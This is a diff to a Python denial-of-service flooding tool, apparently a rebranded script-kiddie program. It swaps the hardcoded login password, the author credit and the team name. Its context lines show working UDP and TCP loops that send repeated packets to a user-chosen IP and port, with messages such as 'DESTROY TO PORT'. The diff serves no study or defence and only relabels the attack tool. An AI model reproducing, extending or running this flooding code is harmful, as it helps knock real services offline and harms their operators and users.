@@ -8,7 +8,7 @@ import time
 
 os.system("clear")
 #login tools
-password ="viplexa"
+password ="KaisarDek"
 
 print("""\u001b[35m                              
  __         ______     ______     __     __   __    
@@ -33,7 +33,7 @@ print("\u001b[35m{√} Successfully Loginned")
 time.sleep(2)
 
 os.system("clear")
-print(" \033[95m Tools By : XinZz. ")
+print(" \033[95m Tools By : Xiao Yan. ")
 print("\033[0m")
 print(""" \033[96m
    
@@ -70,7 +70,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \033[91m Rename X Vip Teams Attack To :\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
+			print(i +" \033[91m Rename X Kaisar Attack To :\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
 		except:
 			print("\033[92m DOWN GAK TUUH!!!")
 
@@ -84,7 +84,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033[91m Rename X Vip Teams Attack To :\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
+			print(i +"\033[91m Rename X Kaisar Attack To :\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
 		except:
 			s.close()
 			print("\033[92m DOWN GAK TUUH!!!")
@@ -99,7 +99,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033[91m Rename X Vip Teams Attack To :\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
+			print(i +"\033[91m Rename X Kaisar Attack To :\033[0m%s\033[91m DESTROY TO PORT:\033[0m%s"%(ip,port))
 		except:
 			s.close()
 			print("\033[92m DOWN GAK TUUH!!!")
